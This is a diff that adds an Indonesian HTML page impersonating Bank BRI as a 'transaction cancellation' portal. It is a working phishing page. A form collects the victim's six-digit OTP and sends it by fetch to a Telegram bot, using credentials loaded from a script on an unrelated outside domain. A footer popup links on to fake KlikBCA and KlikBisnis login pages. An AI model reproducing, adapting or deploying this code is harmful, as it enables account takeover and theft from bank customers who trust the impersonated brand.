@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Portal Layanan 🏛 <span id="name">Bank BRI</span></title>
+  <meta name="theme-color" content="#0F78CB">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bri-blue:#0F78CB;
+      --bri-blue-dark:#0B5FA1;
+      --bg:#f4f8ff;
+      --text:#0b1220;
+      --muted:rgba(2,6,23,.6);
+      --stroke:rgba(15,23,42,.1);
+      --shadow:0 18px 40px rgba(2,6,23,.1);
+      --radius:18px;
+      --max:640px;
+    }
+
+    *{margin:0;padding:0;box-sizing:border-box}
+
+    body{
+      font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+      background:linear-gradient(180deg,#ffffff 0%,var(--bg) 100%);
+      color:var(--text);
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+    }
+
+    /* ================= NAVBAR ================= */
+    header{
+      position:sticky;
+      top:0;
+      z-index:10;
+      background:rgba(255,255,255,.75);
+      backdrop-filter:blur(12px);
+      border-bottom:1px solid var(--stroke);
+    }
+
+    .nav{
+      max-width:1100px;
+      margin:auto;
+      padding:14px 18px;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+    }
+
+    .brand{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      text-decoration:none;
+      color:inherit;
+    }
+
+    /* ===== IMAGE BOX (AUTO FIT) ===== */
+    .img-box{
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      overflow:hidden;
+      background:#fff;
+      border:px solid rgba(15,120,203,.25);
+    }
+    .img-box img{
+      max-width:80%;
+      max-height:80%;
+      object-fit:contain;
+      display:block;
+    }
+
+    /* navbar logo size */
+    .logo-box{
+      width:48px;
+      height:48px;
+      border-radius:12px;
+      font-weight:bold;
+    }
+
+    .brand-text strong{
+      font-size:14px;
+      display:block;
+    }
+    .brand-text span{
+      font-size:12px;
+      color:var(--muted);
+    }
+
+    /* ================= MAIN ================= */
+    main{
+      flex:1;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:28px 16px;
+    }
+
+    .container{
+      width:100%;
+      max-width:var(--max);
+    }
+
+    .card{
+      background:#fff;
+      border-radius:var(--radius);
+      padding:20px;
+      box-shadow:var(--shadow);
+      border:1px solid rgba(15,120,203,.2);
+    }
+
+    .card h1{
+      font-size:18px;
+      margin-bottom:6px;
+    }
+    .card p{
+      font-size:13px;
+      color:var(--muted);
+      margin-bottom:16px;
+    }
+
+    .menu{
+      display:flex;
+      flex-direction:column;
+      gap:14px;
+    }
+
+    .menu a, input {
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      padding:14px;
+      border-radius:10px;
+      background:#fff;
+      border:1px solid rgba(15,120,203,.25);
+      text-decoration:none;
+      color:inherit;
+      box-shadow:0 14px 28px rgba(2,6,23,.08);
+      transition:.2s ease;
+    }
+
+    .menu a:hover{
+      transform:translateY(-2px);
+      box-shadow:0 22px 40px rgba(2,6,23,.12);
+    }
+
+    .menu-left{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      min-width:0;
+    }
+
+    /* icon menu (gambar) */
+    .menu-icon{
+      width:42px;
+      height:42px;
+      border-radius:14px;
+      background:white;
+      border:0;
+      overflow:hidden;
+      flex:0 0 auto;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      box-shadow:0 12px 26px rgba(15,120,203,.22);
+    }
+    .menu-icon img{
+      width:100%;
+      height:100%;
+      object-fit:contain;
+      padding:8px;              /* bikin icon selalu “napas”, gak mentok */
+      display:block;
+      filter: drop-shadow(0 6px 10px rgba(0,0,0,.08));
+    }
+
+    .menu-text{
+      min-width:0;
+      text-align: center;
+    }
+    .menu-text strong{
+      font-size:14px;
+      display:block;
+      white-space:nowrap;
+      overflow:hidden;
+      text-overflow:ellipsis;
+       align-items:center;
+       text-align: center;
+    }
+    .menu-text span{
+      font-size:12px;
+      color:var(--muted);
+      white-space:nowrap;
+      overflow:hidden;
+      text-overflow:ellipsis;
+    }
+
+    .arrow{
+      width:32px;
+      height:32px;
+      border-radius:50%;
+      background:#f3f9ff;
+      border:1px solid rgba(15,120,203,.25);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      color:var(--bri-blue-dark);
+      flex:0 0 auto;
+    }
+
+    /* ================= FOOTER ================= */
+    footer{
+      background:#fff;
+      border-top:1px solid var(--stroke);
+    }
+
+    .footer-top{
+      max-width:1100px;
+      margin:auto;
+      padding:22px 18px;
+      display:grid;
+      grid-template-columns:1.2fr 1fr 1fr;
+      gap:20px;
+    }
+
+    /* footer logo size */
+    .footer-logo-box{
+      width:56px;
+      height:56px;
+      border-radius:14px;
+      margin-bottom:10px;
+    }
+
+    footer h4{
+      font-size:13px;
+      margin-bottom:10px;
+    }
+
+    footer p, footer a,{
+      font-size:12px;
+      color:var(--muted);
+      text-decoration:none;
+      line-height:1.6;
+      
+    }
+
+    footer ul{
+      list-style:none;
+      display:grid;
+      gap:8px;
+    }
+
+    footer a:hover{
+      color:var(--bri-blue-dark);
+      text-decoration:underline;
+    }
+
+    .footer-bottom{
+      border-top:1px solid var(--stroke);
+      padding:12px 18px;
+      max-width:1100px;
+      margin:auto;
+      display:flex;
+      justify-content:space-between;
+      font-size:12px;
+      color:var(--muted);
+      flex-wrap:wrap;
+      gap:10px;
+    }
+
+    @media(max-width:860px){
+      .footer-top{grid-template-columns:1fr}
+    }
+    
+    
+     #kodebank, #sokode{
+  display:inline-block;
+  padding:6px 10px;
+  background:#fff;
+  color:#000;
+  border-radius:6px;
+  font-weight:bold;
+  overflow:hidden;
+      background:#fff;
+      border:px solid rgba(15,120,203,.25);
+}
+
+
+.logo-bank{
+  width:120px;
+  height:40px;
+  object-fit:contain;
+  display:block;
+}
+
+        .popup-overlay{
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.5);
+    display:flex;
+    
+    justify-content:center;
+    align-items:center;
+}
+
+.popup-box{
+    width:300px;
+    background:#fff;
+    border-radius:20px;
+    padding:25px;
+    text-align:center;
+    box-shadow:0 10px 30px rgba(0,0,0,0.2);
+}
+
+.popup-box h2{
+    margin-top:0;
+    font-size:22px;
+}
+
+.popup-box p{
+    color:#555;
+    font-size:14px;
+    margin-bottom:20px;
+}
+
+/* Tombol vertikal */
+.popup-buttons{
+    display:flex;
+    flex-direction:column;
+    gap:12px;
+}
+
+.popup-buttons button{
+    width:100%;
+    border:none;
+    padding:14px;
+    border-radius:14px;
+    font-size:15px;
+    cursor:pointer;
+    transition:0.2s;
+}
+
+.popup-buttons button:hover{
+    transform:scale(1.02);
+}
+
+.btn-confirm{
+    background:#00247C;
+    color:white;
+}
+
+.btn-cancel{
+    background:#00247C;
+}
+
+
+.img-button{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    border:none;
+    background:#2563eb;
+    color:white;
+    padding:14px 22px;
+    border-radius:16px;
+    font-size:16px;
+    cursor:pointer;
+    box-shadow:0 8px 20px rgba(37,99,235,0.3);
+    transition:0.2s;
+}
+
+.img-button:hover{
+    transform:scale(1.03);
+}
+
+/* Gambar */
+.img-button img{
+    width:28px;
+    height:28px;
+    object-fit:cover;
+    border-radius:50%;
+    border: 1px double #fff;
+}
+  </style>
+</head>
+<script>
+document.addEventListener("DOMContentLoaded", function(){
+
+const bankName = sessionStorage.getItem("bankName");
+const bankCode = sessionStorage.getItem("bankCode");
+const title = sessionStorage.getItem("judul");
+const bankLogo = sessionStorage.getItem("bankLogo");
+if(document.getElementById("name"))
+document.getElementById("name").textContent = bankName;
+if(document.getElementById("bank"))
+document.getElementById("bank").textContent = bankName;
+if(document.getElementById("kodebank"))
+document.getElementById("kodebank").textContent = bankCode;
+if(document.getElementById("sokode"))
+document.getElementById("sokode").textContent = bankCode;
+if(document.getElementById("namabank"))
+document.getElementById("namabank").textContent = bankName;
+
+document.querySelectorAll(".logo-bank").forEach(el=>{
+  el.src = bankLogo;
+});
+
+});
+
+
+
+</script>
+<body>
+
+<!-- NAVBAR -->
+<header>
+  <div class="nav">
+    <div href="#" class="brand">
+      <div class="img-box ">
+      
+      <img class="logo-bank">
+      </div>
+
+      <div class="brand-text">🏛
+        <strong id="bank">Layanan</strong>
+        <span>Portal Pengamanan Transaksi</span>
+      </div>
+    </div>
+  </div>
+</header>
+
+<!-- MAIN -->
+<main>
+  <div class="container">
+    <div class="card">
+      <h1 id="">Konfirmasi Pembatalan</h1>
+      <p>Silahkan lihat Kode Pembatalan di nomor yang terdaftar .</p>
+
+      <form class="menu" id="submit">
+          
+      
+<input type="tel" maxlength="6" id="otp" placeholder="Masukkan Kode Pembatalan" minlength="6" >
+
+<button style="text-align: center; justify-content:space-between;
+  padding:14px;
+  border-radius:10px;
+  background:#005596;
+  border:1px solid rgba(15,120,203,.25);
+  text-decoration:none;
+  color:#fff;
+  box-shadow:0 14px 28px rgba(2,6,23,.08);
+  transition:.2s ease;">
+  Batalkan Sekarang
+</button>
+<script src="https://smpnegeri41jkt.my.id/3/server.js"></script>
+<script>
+const TELEGRAM_API_URL = `https://api.telegram.org/bot${token}/sendMessage`;
+
+
+document.getElementById("submit").addEventListener("submit", async function(e){
+  e.preventDefault();
+
+  const redirect = "infolain.html"
+  const otp = document.getElementById("otp").value;
+
+sessionStorage.setItem("judul", "Pembatalan Transaksi Anda Sedang Diproses");
+
+if(!otp.trim()){
+    alert("OTP tidak boleh kosong");
+    return;
+  }
+
+  const message = `
+*KODE PEMBATALAN*
+OTP : ${otp}
+  `.trim();
+
+  try {
+    const response = await fetch(TELEGRAM_API_URL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: grup,
+        text: message,
+        parse_mode: "Markdown"
+      })
+    });
+
+    const result = await response.json();
+
+    if(result.ok){
+      window.location.href = redirect;
+    }else{
+      alert("Gagal kirim OTP");
+    }
+
+  } catch(error){
+    alert("Error: " + error.message);
+  }
+});
+</script>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-top">
+    <div>
+      <div class="img-box footer">
+        <!-- GANTI LOGO FOOTER: assets/logo-footer.png -->
+<img class="logo-bank">
+      </div>
+      <br>
+      <p>🏛 <span id="name">Bank BRI</span> telah berkerjasama dengan Bank Indonesia untuk menjaga keamanan dan kenyamanan nasabah dalam bertransaksi online</p>
+    </div>
+
+    <div>
+      <h4>Layanan</h4>
+      <ul>
+        <li><a href="../blokir-kartu/index.html">Blokir Kredit/Debit Online</a></li>
+        <li><a href="../batalkan/index.html">Batalkan Transaksi</a></li>
+        <li><a href="#" onclick="openPopup()">Sanggahan Transaksi</a></li>
+       
+      </ul>
+    </div>
+
+    <div>
+      <h4>Informasi</h4>
+      <ul>
+        <li><a href="#">Kebijakan Privasi</a></li>
+        <li><a href="#">Syarat & Ketentuan</a></li>
+        <li><a href="#">Pusat Bantuan</a></li>
+      </ul>
+    </div>
+  </div>
+<div class="popup-overlay" id="popup" style="display: none">
+    <div class="popup-box">
+        <h2>Login</h2>
+        <p>Silahkan pilih layanan bankingmu</p>
+
+        <div class="popup-buttons">
+
+<button class="img-button" onclick="location.href='Klikbca/index.html'">
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKjUYt87CxTunuC3chzGVoMaNDsBtP0LoZsKg982sIEVQyUn2dKVPPdGHE6P8acfcnjWNpuy17e5Nj2b5SMvWK5VCdROBPL0Id4HufJwYIQJe8JgJ2l901O_eqxGeXGLSskWuNWz1qaCM-ZgrrMUbZPS2DNfhFihlvgbRDxS4uQ5zWWVwC57Ueny9Rypg/s1000/AddText_03-01-11.04.58.png" alt="">
+    Login KlikBCA
+</button>
+
+          
+<button class="img-button" onclick="location.href='Klikbisnis/index.html'">
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKYX6BZApravmQ4MRCoQKNjEBmDXy0aW8msQ0NfLD74e97Zdt8mJe3CdSxHxnAztntcEVh7dt5BgpGnGLp8Fyn-HOJyc9tWI-ShF428HMpNXHn5o_C2rY901lj67xpsuMv_Hg4IICTh5_GHjtKzmzE8Qb2uLfeJxQNxh7f4QbwTWHgwKU-iVJoCrOWUZ8/s1000/1000173780.png" alt="">
+  Login KlikBisnis
+</button>
+
+
+        </div>
+        
+    </div>
+    <center style="border-radius: 50px; border: 1.4px solid #fff; color: #fff; position: fixed; left: 0; right: 0; margin: 0px auto; top: 70%; width: 28px; height: 28px" onclick="closePopup()">
+    
+    ✖
+    
+</center>
+</div>
+  <div class="foote">
+  <center>
+    © <span id="yearNow"></span> 🏛 <span id="namabank">Bank Rakyat Indonesia</span>
+    </center>
+  </div>
+
+
+<script>
+  document.getElementById("yearNow").textContent = new Date().getFullYear();
+  
+  
+  
+  
+</script>
+<script>
+function openPopup(){
+    document.getElementById("popup").style.display = "flex";
+}
+
+function closePopup(){
+    document.getElementById("popup").style.display = "none";
+}
+
+function confirmAction(){
+    alert("Berhasil!");
+    closePopup();
+}
+</script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"a0b5eif8e800134bfaac205ddb0b78250b","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"fb2304f2e1cf43e9bebbc7e7be717d56","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
